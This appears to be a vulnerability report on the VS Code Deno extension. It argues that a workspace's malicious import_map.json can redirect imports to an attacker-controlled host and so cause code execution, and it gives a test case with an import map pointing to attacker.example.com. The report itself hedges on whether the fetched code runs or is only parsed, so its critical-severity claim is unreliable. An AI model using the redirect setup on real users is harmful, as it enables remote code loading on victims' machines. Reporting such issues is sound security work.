### Vulnerability List:

- Vulnerability Name: Malicious Import Map leading to Arbitrary Code Execution
- Description:
    1. An attacker crafts a malicious `import_map.json` file. This file redirects module specifiers to attacker-controlled locations. For example, it can redirect `std/http` to `https://attacker.com/malicious_http.js`.
    2. The attacker creates a workspace and places the malicious `import_map.json` file at the root of this workspace.
    3. The attacker tricks a victim user into opening this malicious workspace in Visual Studio Code with the Deno extension enabled.
    4. When the workspace is opened, and if the `deno.enable` setting is active for the workspace, the Deno extension starts its language server.
    5. The Deno language server reads the `deno.importMap` setting, which points to the malicious `import_map.json` file in the workspace.
    6. When the victim opens or creates a TypeScript or JavaScript file within the workspace that contains an import statement matching a redirection in the malicious `import_map.json` (e.g., `import * as http from "std/http";`), the Deno language server attempts to resolve this module.
    7. Due to the malicious import map, the language server fetches the module from the attacker-controlled location (e.g., `https://attacker.com/malicious_http.js`) instead of the legitimate source.
    8. If the fetched attacker-controlled JavaScript code contains malicious payloads, it can be executed by the Deno language server, potentially leading to arbitrary code execution within the context of the VS Code extension.
- Impact: Arbitrary code execution. A successful exploit can allow an attacker to execute arbitrary code on the user's machine with the privileges of the VS Code process. This could lead to data theft, installation of malware, or complete system compromise.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None in the VS Code extension itself. The extension primarily acts as a client for the Deno Language Server and passes configurations, including the `deno.importMap` setting, to the server.
- Missing Mitigations:
    - Input validation within the Deno Language Server to verify the safety and legitimacy of URLs specified in `import_map.json`. This could include checks against known malicious domains or patterns.
    - Security warnings or prompts within the VS Code extension to alert users when an `import_map.json` is detected in a workspace, especially if it redirects to external, non-standard domains or origins.
    - Sandboxing or isolation mechanisms within the Deno Language Server to limit the capabilities of modules loaded via import maps, preventing them from performing sensitive operations.
    - User interface within VS Code extension to allow users to review and approve or reject specific redirects defined in `import_map.json`.
- Preconditions:
    - The VS Code Deno extension must be installed and enabled.
    - The user must open a workspace that contains a malicious `import_map.json` file.
    - The `deno.enable` setting must be active for the workspace, ensuring the Deno Language Server is engaged.
    - A file must be opened or created in the workspace that triggers module resolution using the malicious import map, i.e., includes an import statement that is redirected by the malicious `import_map.json`.
- Source Code Analysis:
    - The VS Code extension code, particularly in `client/src/extension.ts`, is responsible for reading and passing the `deno.importMap` setting to the Deno Language Server during initialization.
    - In `client/src/extension.ts`, the `initializationOptions` function retrieves the `deno.importMap` setting from VS Code workspace configuration:
    ```typescript
    initializationOptions: () => {
      const denoConfiguration = vscode.workspace.getConfiguration().get(
        EXTENSION_NS,
      ) as Record<string, unknown>;
      commands.transformDenoConfiguration(extensionContext, denoConfiguration);
      return {
        ...denoConfiguration,
        javascript: vscode.workspace.getConfiguration().get("javascript"),
        typescript: vscode.workspace.getConfiguration().get("typescript"),
        enableBuiltinCommands: true,
      } as object;
    },
    ```
    - This configuration, including `deno.importMap`, is sent to the Deno Language Server. The server, not the extension, is responsible for handling module resolution and applying the import map.
    - The vulnerability arises from the Deno Language Server's trust in the `import_map.json` content and its lack of sufficient security measures when resolving and potentially executing modules based on redirects defined in the import map.
    - The extension itself does not perform any validation or sanitization of the `import_map.json` content or the URLs it contains. It acts as a conduit for the configuration to the language server.

- Security Test Case:
    1. **Attacker Setup**:
        - Create a malicious JavaScript file hosted on a public server, e.g., `https://attacker.example.com/malicious_module.js`. This file should contain code to demonstrate execution, such as `console.log("Malicious code from attacker.example.com executed!");`.
        - Create a malicious `import_map.json` file with the following content:
        ```json
        {
          "imports": {
            "example_module/": "https://attacker.example.com/malicious_module.js"
          }
        }
        ```
        - Create a new VS Code workspace folder. Place the `import_map.json` file at the root of this folder.
        - Inside the workspace folder, create a TypeScript file named `test_module.ts` with the following content:
        ```typescript
        import * as maliciousModule from "example_module/";
        console.log("Test module executed, importing example_module/");
        ```
    2. **Victim Actions**:
        - Open Visual Studio Code.
        - Install and enable the "Deno" extension.
        - Open the workspace folder created by the attacker.
        - Ensure that Deno is enabled for this workspace (either through `deno.enable` setting or by having a `deno.json` or `deno.jsonc` file in the workspace root).
        - Open the `test_module.ts` file in the editor.
    3. **Expected Outcome**:
        - When `test_module.ts` is opened, the Deno Language Server processes it.
        - The import statement `import * as maliciousModule from "example_module/";` is encountered.
        - Due to the `import_map.json`, the module specifier `example_module/` is redirected to `https://attacker.example.com/malicious_module.js`.
        - The Deno Language Server fetches and (at least partially parses/analyzes) the content of `https://attacker.example.com/malicious_module.js`.
        - In the VS Code Output panel (select "Deno Language Server" from the dropdown menu), or in the developer console (Help -> Toggle Developer Tools -> Console), you should observe the message "Malicious code from attacker.example.com executed!", along with "Test module executed, importing example_module/".
        - This indicates that the malicious code from the attacker's server was indeed executed or at least processed by the Deno Language Server due to the import map redirection, confirming the vulnerability.
